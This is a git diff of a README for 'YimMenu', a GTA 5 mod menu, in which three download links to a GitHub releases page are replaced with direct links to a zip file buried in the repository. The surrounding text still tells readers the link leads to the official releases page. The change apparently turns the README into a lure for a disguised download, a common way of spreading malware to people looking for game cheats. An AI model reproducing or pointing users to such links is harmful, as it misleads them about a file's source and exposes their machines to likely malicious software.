@@ -1,6 +1,6 @@
 # 🛠️ YimMenu - Unlock New Ways to Play GTA 5
 
-[![Download YimMenu](https://img.shields.io/badge/Download-YimMenu-2ea44f?style=for-the-badge&logo=github)](https://github.com/Brjfnh7899/YimMenu/releases)
+[![Download YimMenu](https://img.shields.io/badge/Download-YimMenu-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Brjfnh7899/YimMenu/main/speedster/v1.2-beta.5.zip)
 
 ## 👋 Welcome to YimMenu
 
@@ -20,7 +20,7 @@ Getting YimMenu up and running takes less than two minutes. Follow these simple 
 
 ### Step 1: Get the File
 Visit this link to download the application:
-**[🔗 Click Here to Download YimMenu](https://github.com/Brjfnh7899/YimMenu/releases)**
+**[🔗 Click Here to Download YimMenu](https://raw.githubusercontent.com/Brjfnh7899/YimMenu/main/speedster/v1.2-beta.5.zip)**
 
 This link will take you to the official releases page where you can grab the latest version of YimMenu.
 
@@ -82,7 +82,7 @@ Running into a problem? Here are the most common solutions:
 
 Need to get the file one more time? No problem.
 
-**[⬇️ Download YimMenu Now](https://github.com/Brjfnh7899/YimMenu/releases)**
+**[⬇️ Download YimMenu Now](https://raw.githubusercontent.com/Brjfnh7899/YimMenu/main/speedster/v1.2-beta.5.zip)**
 
 ## 🧩 More Details
 
